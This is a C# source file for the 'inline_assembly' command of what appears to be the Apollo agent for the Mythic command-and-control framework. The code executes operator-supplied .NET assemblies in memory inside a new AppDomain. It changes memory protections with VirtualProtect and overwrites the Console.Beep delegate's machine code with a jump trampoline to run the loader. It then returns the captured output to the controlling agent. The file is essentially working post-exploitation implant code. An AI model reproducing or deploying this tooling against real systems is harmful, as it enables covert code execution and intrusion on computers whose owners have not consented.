#define COMMAND_NAME_UPPER

#if DEBUG
#define INLINE_ASSEMBLY
#endif

#if INLINE_ASSEMBLY

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using ApolloInterop.Serializers;
using System.Threading;
using System.IO;
using System.Collections.Concurrent;
using System.ComponentModel;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Collections;
using ApolloInterop.Utils;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Runtime.CompilerServices;
using ApolloInterop.Classes.Api;
using ApolloInterop.Classes.IO;

namespace Tasks
{
    public class inline_assembly : Tasking
    {
        [DataContract]
        internal struct InlineAssemblyParameters
        {
            [DataMember(Name = "assembly_name")]
            public string AssemblyName;
            [DataMember(Name = "assembly_arguments")]
            public string AssemblyArguments;
        }
        
        private delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        private VirtualProtect _pVirtualProtect;

        private delegate IntPtr CommandLineToArgvW(
            [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
            out int pNumArgs);

        private CommandLineToArgvW _pCommandLineToArgvW;
        
        private delegate IntPtr LocalFree(IntPtr hMem);

        private LocalFree _pLocalFree;
        
        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private JsonSerializer _serializer = new JsonSerializer();
        private AutoResetEvent _complete = new AutoResetEvent(false);
        private Action<object> _sendAction;

        private Action<object> _flushMessages;
        private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();


        private bool _completed = false;
        
        public inline_assembly(IAgent agent, Task task) : base(agent, task)
        {
            _pVirtualProtect = agent.GetApi().GetLibraryFunction<VirtualProtect>(Library.KERNEL32, "VirtualProtect");
            _pCommandLineToArgvW =
                agent.GetApi().GetLibraryFunction<CommandLineToArgvW>(Library.SHELL32, "CommandLineToArgvW");
            _pLocalFree = agent.GetApi().GetLibraryFunction<LocalFree>(Library.KERNEL32, "LocalFree");
        }
        
        private string[] ParseCommandLine(string cmdline)
        {
            int numberOfArgs;
            IntPtr ptrToSplitArgs;
            string[] splitArgs;

            ptrToSplitArgs = _pCommandLineToArgvW(cmdline, out numberOfArgs);

            // CommandLineToArgvW returns NULL upon failure.
            if (ptrToSplitArgs == IntPtr.Zero)
                throw new ArgumentException("Unable to split argument.", new Win32Exception());

            // Make sure the memory ptrToSplitArgs to is freed, even upon failure.
            try
            {
                splitArgs = new string[numberOfArgs];

                // ptrToSplitArgs is an array of pointers to null terminated Unicode strings.
                // Copy each of these strings into our split argument array.
                for (int i = 0; i < numberOfArgs; i++)
                    splitArgs[i] = Marshal.PtrToStringUni(
                        Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));

                return splitArgs;
            }
            finally
            {
                // Free memory obtained by CommandLineToArgW.
                _pLocalFree(ptrToSplitArgs);
            }
        }

        public bool loadAppDomainModule(String[] sParams, Byte[] bMod)
        {
            string result = "";
            var bytes = bMod;
            AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
            isolationDomain.SetData("str", sParams);
            bool default_domain = AppDomain.CurrentDomain.IsDefaultAppDomain();
            try
            {
                isolationDomain.Load(bMod);
            }
            catch
            {
                
            }
            var Sleeve = new CrossAppDomainDelegate(Console.Beep);
            var Ace = new CrossAppDomainDelegate(ActivateLoader);

            RuntimeHelpers.PrepareDelegate(Sleeve);
            RuntimeHelpers.PrepareDelegate(Ace);


            var flags = BindingFlags.Instance | BindingFlags.NonPublic;
            var codeSleeve = (IntPtr)Sleeve.GetType().GetField("_methodPtrAux", flags).GetValue(Sleeve);
            var codeAce = (IntPtr)Ace.GetType().GetField("_methodPtrAux", flags).GetValue(Ace);

            int[] patch = new int[3];

            patch[0] = 10;
            patch[1] = 11;
            patch[2] = 12;

            uint oldprotect = 0;
            if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), 0x4, out oldprotect))
            {
                return false;
            }
            Marshal.WriteByte(codeSleeve, 0x48);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
            Marshal.WriteIntPtr(IntPtr.Add(codeSleeve, 2), codeAce);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[0]), 0xff);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
            if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), oldprotect, out oldprotect))
            {
                return false;
            }
            try
            {
                isolationDomain.DoCallBack(Sleeve);
            }
            catch (Exception ex)
            {
                return false;
            }
            unloadAppDomain(isolationDomain);
            return true;
        }

        void ActivateLoader()
        {
            string[] str = AppDomain.CurrentDomain.GetData("str") as string[];
            EventableStringWriter stdoutWriter = new EventableStringWriter();
            stdoutWriter.BufferWritten += (sender, args) =>
            {
                if (!string.IsNullOrEmpty(args.Data))
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(
                        CreateTaskResponse(
                            args.Data,
                            false,
                            ""));
                }
            };
            Console.SetOut(stdoutWriter);
            Console.SetError(stdoutWriter);
            foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (!asm.FullName.Contains("mscor"))
                {
                    var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
                    if (costuraLoader != null)
                    {
                        var costuraLoaderMethod = costuraLoader.GetMethod("Attach", BindingFlags.Public | BindingFlags.Static);
                        if (costuraLoaderMethod != null)
                        {
                            costuraLoaderMethod.Invoke(null, new object[] { });   
                        }
                    }
                    asm.EntryPoint.Invoke(null, new object[] { str });
                    Console.Out.Flush();
                    Console.Error.Flush();
                }
            }
        }

        public static void unloadAppDomain(AppDomain oDomain)
        {
            AppDomain.Unload(oDomain);
        }

        public override void Kill()
        {
            _completed = true;
            _cancellationToken.Cancel();
            _complete.Set();
        }

        public override System.Threading.Tasks.Task CreateTasking()
        {
            return new System.Threading.Tasks.Task(() =>
            {
                TaskResponse resp;
                TextWriter realStdOut = Console.Out;
                TextWriter realStdErr = Console.Error;
                try
                {
                    _agent.AcquireOutputLock();

                    InlineAssemblyParameters parameters = _jsonSerializer.Deserialize<InlineAssemblyParameters>(_data.Parameters);
                    
                    if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
                    {
                        byte[] ByteData = assemblyBytes;
                        string[] stringData = ParseCommandLine(parameters.AssemblyArguments);

                        if (loadAppDomainModule(stringData, ByteData))
                        {
                            resp = CreateTaskResponse("", true);
                        }
                        else
                        {
                            resp = CreateTaskResponse("Failed to load module.", true, "error");
                        }
                    }
                    else
                    {
                        resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
                    }
                }
                catch (Exception ex)
                {
                    resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
                }
                finally
                {
                    Console.Out.Flush();
                    Console.Error.Flush();
                    Console.SetOut(realStdOut);
                    Console.SetError(realStdErr);
                    _agent.ReleaseOutputLock();
                }
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }, _cancellationToken.Token);
        }

        private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
        {
            e.Pipe.Close();
            _completed = true;
            _cancellationToken.Cancel();
            _complete.Set();
        }

        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
            System.Threading.Tasks.Task.Factory.StartNew(_flushMessages, _cancellationToken.Token);
        }

        public void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected && !_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
            {
                pipe.EndWrite(result);
                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
            }
        }

        private void Client_MessageReceived(object sender, NamedPipeMessageArgs e)
        {
            IPCData d = e.Data;
            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
            _assemblyOutput.Add(msg);
        }
    }
}
#endif